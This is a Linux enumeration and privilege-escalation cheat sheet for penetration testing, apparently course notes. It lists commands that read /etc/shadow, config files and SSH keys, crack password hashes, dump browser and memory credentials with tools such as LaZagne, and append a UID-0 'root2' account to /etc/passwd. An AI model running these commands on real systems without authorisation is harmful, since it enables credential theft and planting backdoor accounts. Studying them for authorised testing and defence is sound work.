---
title: Linux Enumeration Cheat sheet
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege escalation
  - linux
---
# Linux Enumeration Cheat sheet

## Enumeration scripts

!!! abstract "Enumeration scripts"
    
    - [Scan the Linux system with "linEnum"](linenum.md).
    - [Search for possible paths to escalate privileges with "linPEAS"](linpeas.md).
    - [Enumerate privileges with "Linux Privilege Checker" tool](linux-privilege-checker.md).
    - [Enumerate possible exploits with "Linux Exploit Suggester" tool](linux-exploit-suggester.md).
    - Preinstalled on our local Kali machine at **/usr/bin/unix-privesc-check** 


!!! abstract "Other resources for Linux enumeration and privilege escalation"
    
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
    - [HackTricks - Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

## Operating System and Kernel

```bash
# Current user
whoami

# User ID and groups
id

# Hostname
hostname

# OS and kernel version
uname -a

# Only kernel
uname -r

# Achitecture
arch

# Kernel version details
cat /proc/version

# OS release information
lsb_release -a

# List loaded kernel modules
lsmod

# Once we've collected the list of loaded modules and identified those, we want more information about, such as libata in the above example, we can use modinfo to find out more about the specific module. 
/sbin/modinfo moduleName
# Example: /sbin/modinfo libata

# CPU details
lscpu

# Environmental variables
env

# Available login shells
cat /etc/shells
```




## Users and Env Variables

```bash
# List home directories (users)
ls /home

# Users with login shell
grep "*sh$" /etc/passwd

# List groups
cat /etc/group

# List sudo group members
getent group sudo

# Last login of users
lastlog

# Logged-in users
who

# Active user sessions
w
```

**Env variables**:

```bash
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

## Processes

```bash
# Processes run by root
ps aux | grep root

# Processes run by other users
ps au

# Check Bash history
history
```




## SSH Enumeration

```bash
# Check SSH directory permissions
ls -l ~/.ssh

# List user’s sudo privileges
sudo -l
```

## Sensitive Files

### Hidden Files and Directories

```bash
# Hidden files: the dotfiles
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

# Hidden directories
find / -type d -name ".*" -ls 2>/dev/null
```

### Temporary Folders

```bash
# Check temp directories
ls -l /tmp /var/tmp /dev/shm
```

### History and Password Files

```bash
# Bash history
history

# History files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

# User list and possible password hashes
cat /etc/passwd

# Shadow file (if readable)
cat /etc/shadow
```


### SSH Keys

```bash
# Enumerate SSH private keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Enumerate SSH public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```


### Configuration files

```bash
# Return files with extension .conf, .config and .cnf, which in linux are configuration files.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done


# Search for three words (user, password, pass) in each file with the file extension .cnf.
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

```


```bash
# Configuration files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# Scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

Checking for Credentials in Config Files

```bash
# Find config files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Check for sensitive information
cat /var/www/html/config.php

# WordPress credentials
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```


### Databases

```bash
# Search for databases
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```


### Scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

### Files including the .txt file extension and files that have no file extension at all

Admin may change the name of configuration files. But you can try to find them:

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```



### Bash History

```bash
tail -n5 /home/*/.bash*
```

### Logs

| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |


```bash
 for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```




## File System and Storage

```bash
# List mounted file systems
df -h

# List all drives that will be mounted at boot time
cat /etc/fstab

# List all mounted filesystems (more complete even than fstab)
mount

# View all available disks
lsblk

# Printers attached to system
lpstat
```

In some situations, showing information for all local disks on the system might reveal partitions that are not mounted. Depending on the system configuration (or misconfiguration), we then might be able to mount those partitions and search for interesting documents, credentials, or other information that could allow us to escalate our privileges or get a better foothold in the network.

## SETUID, SETGID and Writable Files

[https://gtfobins.github.io](https://gtfobins.github.io) 

```bash
# Check SETUID and SETGID permissions
find / -perm /4000 2>/dev/null

# Another way to check SETUID and SETGID permissions
find / -perm -u=s -type f 2>/dev/null

# Writable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Anoher way to find writable directories
find / -writable -type d 2>/dev/null

# Writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Anoher way to find writable files
find / -writable -type f 2>/dev/null
```

## Cron Jobs

Scheduled tasks are listed under the /etc/cron.* directories, there * represents the frequency at which the task will run.

```bash
# Check scheduled cron jobs
ls -la /etc/cron.*
```

System admin sometimes add their own scheduled task in the `/etc/crontab` file:

```bash
# One way
cat /etc/crontab

# Other way
crontab -l

# Check also with sudo
sudo crontab -l
```

## System Calls and Debugging

```bash
# Trace system calls
strace ping -c1 10.129.112.20
```

## Services and Installed Packages

```bash
# Installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# Check sudo version
sudo -V

# List binaries
ls -l /bin /usr/bin/ /usr/sbin/

# Packages installed in a Debian-based Linux installation:
dpkg -l
```

### Checking Installed Packages Against GTFOBins

```bash
# Install pup
sudo apt install pup -y

# Generate installed package list
dpkg --get-selections | awk '{print $1}' > installed_pkgs.list

# Compare installed packages against GTFOBins
[ -f installed_pkgs.list ] && curl -s https://gtfobins.github.io/ | pup 'a text{}' | grep -v ' ' | while read -r i; do grep -q "^$i$" installed_pkgs.list && echo "Check GTFO for: $i"; done || echo "Error: installed_pkgs.list not found"
```

## Services

### Running Services by User

```bash
# Services run by root
ps aux | grep root
```

### Daemons

System administrators often rely on custom daemons to execute ad-hoc tasks, and they sometimes neglect security best practices.

```bash
# we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass". 
watch -n 1 "ps -aux | grep pass"
```

## Network Interfaces and Firewalls

```bash
# Network interfaces
ifconfig

# IP information
ip -a

# Routing table
route
routel

# Detailed routing table
netstat -rnv

# Network connections: 
ss -anp
# -a list all connections
# -n avoid hostname resolution,  
# -p list process name


# DNS configuration
cat /etc/resolv.conf

# Local host mappings
cat /etc/hosts

# ARP table
arp -a

# Root privileges required to list firewall rules with iptables. Conf file located at /etc/iptables/rules.4, for example
[TO BE DONE]
```

Capture live traffic with tcpdump. For that we need sudo permissions since it needs to set up raw sockets in order to capture the traffic:

```bash
sudo tcpdump -i lo -A | grep "pass"
```



## Credentials storage

### Shadow file

The `/etc/shadow` file has a unique format in which the entries are entered and saved when new users are created.

```
htb-student: 	$y$j9T$3QSBB6CbHEu...SNIP...f8Ms: 	18955: 	0: 	99999: 	7: 	: 	: 	:
<username>: 	<encrypted password>: 	<day of last change>: 	<min age>: 	<max age>: 	<warning period>: 	<inactivity period>: 	<expiration date>: 	<reserved field>
```


The encryption of the password in this file is formatted as follows:

|            |            |                               |
| ---------- | ---------- | ----------------------------- |
| `$ <type>` | `$ <salt>` | `$ <hashed>`                  |
| `$ y`      | `$ j9T`    | `$ 3QSBB6CbHEu...SNIP...f8Ms` |


The type (`id`) is the cryptographic hash method used to encrypt the password. Many different cryptographic hash methods were used in the past and are still used by some systems today.

|**ID**|**Cryptographic Hash Algorithm**|
|---|---|
|`$1$`|[MD5](https://en.wikipedia.org/wiki/MD5)|
|`$2a$`|[Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher))|
|`$5$`|[SHA-256](https://en.wikipedia.org/wiki/SHA-2)|
|`$6$`|[SHA-512](https://en.wikipedia.org/wiki/SHA-2)|
|`$sha1$`|[SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)|
|`$y$`|[Yescrypt](https://github.com/openwall/yescrypt)|
|`$gy$`|[Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1)|
|`$7$`|[Scrypt](https://en.wikipedia.org/wiki/Scrypt)|

The /etc/shadow file can only be read by the user root.

By default, the SHA-512 (`$6$`) encryption method is used on the latest Linux distributions.

### Passwd file

The /etc/passwd

```						
htb-student: 	x: 	1000: 	1000: 	,,,: 	/home/htb-student: 	/bin/bash
<username>: 	<password>: 	<uid>: 	<gid>: 	<comment>: 	<home directory>: 	<cmd executed after logging in>
```

The `x` in the password field indicates that the encrypted password is in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty.

Create a new user in /etc/passwd:

```bash
# first generate the password hash using the openssl tool and the passwd argument.  By default, if no other option is specified, openssl will generate a hash using the crypt algorithm, a supported hashing mechanism for Linux authentication.
openssl passwd w00t
# Output: Fdzt.eqJQ4s0g

# Once we have the generated hash, we will add a line to /etc/passwd using the appropriate format:
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
# the root2 user and the w00t password hash in our /etc/passwd record were followed by the user id (UID) zero and the group id (GID) zero. These zero values specify that the account we created is a superuser Linux account. 
```


### Opasswd

The  [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html) (`PAM`) library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the `/etc/security/opasswd`. 

Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

```bash
# Reading /etc/security/opasswd
sudo cat /etc/security/opasswd

# cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.


### Cracking Linux Credentials

#### Unshadow

```shell-session
cp /etc/passwd /tmp/passwd.bak 
cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked

```

#### MD5
If we observe a MD5 hash, like in this case (see `$1$`)

```shell-session
sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```

Then:

```shell-session
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```


### Dumping memory and cache

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. 

#### [mimipenguin](https://github.com/huntergregal/mimipenguin)

```shell-session
sudo python3 mimipenguin.py
```


#### [lazagne](https://github.com/AlessandroZ/LaZagne)

```shell-session
sudo python2.7 laZagne.py all

# And browsers:
sudo python3 laZagne.py browsers

```

Firefox stored credentials:

```bash
ls -l .mozilla/firefox/ | grep default 

cat .mozilla/firefox/xxxxxxxxx-xxxxxxxxxx/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

```
git clone https://github.com/unode/firefox_decrypt.git   
cd firefox_decrypt 
python firefox_decrypt.py
```



## Automated Enumeration

 Preinstalled on our local Kali machine at **/usr/bin/unix-privesc-check** :

```bash
unix-privesc-check

# Enumerate in standard mode
./unix-privesc-check standard > output.txt
```


[Scan the Linux system with "linEnum"](linenum.md).

[Search for possible paths to escalate privileges with "linPEAS"](linpeas.md).
 
[Enumerate privileges with "Linux Privilege Checker" tool](linux-privilege-checker.md).

[Enumerate possible exploits with "Linux Exploit Suggester" tool](linux-exploit-suggester.md).
